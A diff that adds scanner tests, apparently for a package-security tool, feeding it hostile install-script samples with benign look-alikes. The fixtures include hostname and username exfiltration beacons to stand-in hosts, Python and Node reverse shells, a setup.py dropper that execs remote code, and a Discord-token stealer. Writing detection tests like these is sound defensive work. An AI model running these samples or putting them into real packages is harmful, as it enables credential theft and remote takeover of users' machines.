@@ -185,6 +185,77 @@ class MissedMalwareTests(unittest.TestCase):
         self.assertEqual(scan({"skills/q/SKILL.md": order}).verdict, "block")
 
 
+class RoundTwoLessonTests(unittest.TestCase):
+    """What round two's misses taught, studied only on its own samples; round three measures the fixes."""
+
+    def test_install_scripts_that_send_the_user_or_machine_name_through_variables(self):
+        beacon = ("bash -c 'u=$(whoami) && h=$(hostname) && for v in \"$u\" \"$h\"; do "
+                  "x=$(echo -n \"$v\" | xxd -p) && curl \"http://$x.exfil.example.invalid/\"; done'")
+        for script in (beacon, "nslookup $USER.$HOSTNAME.exfil.example.invalid",
+                       "powershell -c \"iwr http://exfil.example.invalid/?u=$env:USERNAME\""):
+            pkg = json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"preinstall": script}})
+            self.assertIn("PAH-C004", rules(scan({"package.json": pkg}), "high"), script)
+        for script in ("curl -fsSL https://github.example.invalid/o/r/releases/download/v1/tool-$(uname -s)-$(uname -m) "
+                       "-o bin/tool", "echo installing for $USER", "node install.js --user $(whoami)"):
+            pkg = json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"postinstall": script}})
+            self.assertNotIn("PAH-C004", rules(scan({"package.json": pkg})), script)
+
+    def test_reverse_shells_written_over_several_statements(self):
+        py = ("import os\nimport socket\nimport subprocess\n"
+              "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('203.0.113.7', 4444))\n"
+              "os.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh', '-i'])\n")
+        self.assertIn("PAH-C021", rules(scan({"setup.py": py}), "critical"))
+        js = ("const net = require('net');\nconst { spawn } = require('child_process');\nconst sh = spawn('/bin/sh', []);\n"
+              "const c = new net.Socket();\nc.connect(4444, '203.0.113.7', () => { c.pipe(sh.stdin); "
+              "sh.stdout.pipe(c); });\n")
+        self.assertIn("PAH-C021", rules(scan({"package.json": PKG, "index.js": js}), "high"))
+        pty = ("import os\nimport pty\nmaster, slave = pty.openpty()\nos.dup2(slave, 0)\n"
+               "sock.connect(('localhost', 8080))\n")  # a terminal helper: no socket handed to a shell
+        self.assertNotIn("PAH-C021", rules(scan({"term/helper.py": pty})))
+
+    def test_code_written_to_a_file_and_run_is_judged_as_code(self):
+        dropper = ("from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _f\n"
+                   "from sys import executable as _x\nfrom os import system as _s\n_t = _f(delete=False)\n"
+                   "_t.write(b\"\"\"from urllib.request import urlopen as _u;"
+                   "exec(_u('https://stage.example.invalid/p').read())\"\"\")\n"
+                   "_t.close()\n_s(f\"start {_x} {_t.name}\")\nsetup(name='demo', version='1.0')\n")
+        self.assertIn("PAH-C001", rules(scan({"setup.py": dropper}), "high"))
+        helper = ("import subprocess, sys, tempfile\n"
+                  "with tempfile.NamedTemporaryFile('w', suffix='.py', delete=False) as f:\n"
+                  "    f.write('import sys\\nprint(sys.version_info[:2])\\n')\n"
+                  "subprocess.run([sys.executable, f.name], check=True)\n")  # a build step that checks the interpreter
+        self.assertEqual(rules(scan({"setup.py": helper}), "low"), set())
+
+    def test_a_custom_install_command_that_goes_online(self):
+        hooked = ("import urllib.request\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
+                  "class PostInstall(install):\n    def run(self):\n        install.run(self)\n"
+                  "        urllib.request.urlopen('https://telemetry.example.invalid/ping')\n"
+                  "setup(name='demo', version='1.0', cmdclass={'install': PostInstall})\n")
+        self.assertIn("PAH-C006", rules(scan({"setup.py": hooked})))
+        plain = ("import urllib.request\nfrom setuptools import setup\n"
+                 "VERSION = urllib.request.urlopen('https://versions.example.invalid/v').read().decode()\n"
+                 "setup(name='demo', version=VERSION)\n")  # no replaced install step: reported, not warned
+        self.assertNotIn("PAH-C006", rules(scan({"setup.py": plain})))
+
+    def test_entry_files_raise_only_what_runs_on_import(self):
+        meta = "[project]\nname = 'demo'\nversion = '1.0'\n"
+        body = ("import socket\nimport urllib.request\n\n\ndef main():\n"
+                "    urllib.request.urlopen('https://ping.example.invalid/?h=' + socket.gethostname())\n\n\n")
+        waits = body + "if __name__ == '__main__':\n    main()\n"  # a server's entry point: runs when asked
+        self.assertNotIn("PAH-C004", rules(scan({"pyproject.toml": meta, "demo/__init__.py": waits}), "high"))
+        imported = body + "main()\n"
+        self.assertIn("PAH-C004", rules(scan({"pyproject.toml": meta, "demo/__init__.py": imported}), "high"))
+        listed = "BLOCKED = [\n    'mail.example.invalid',\n    'webhook.site',\n    'ngrok.io',\n]\n"  # a blocklist
+        self.assertNotIn("PAH-C007", rules(scan({"pyproject.toml": meta, "demo/__init__.py": listed}), "high"))
+
+    def test_messaging_app_tokens_count_as_credentials(self):
+        grab = ("import os\nimport requests\n"
+                "path = os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb')\n"
+                "tokens = [open(os.path.join(path, f), errors='ignore').read() for f in os.listdir(path)]\n"
+                "requests.post('https://collect.example.invalid/t', json={'t': tokens})\n")
+        self.assertIn("PAH-C004", rules(scan({"setup.py": grab}), "critical"))
+
+
 class CommandTests(unittest.TestCase):
     CWD = "/home/agent/project"
 
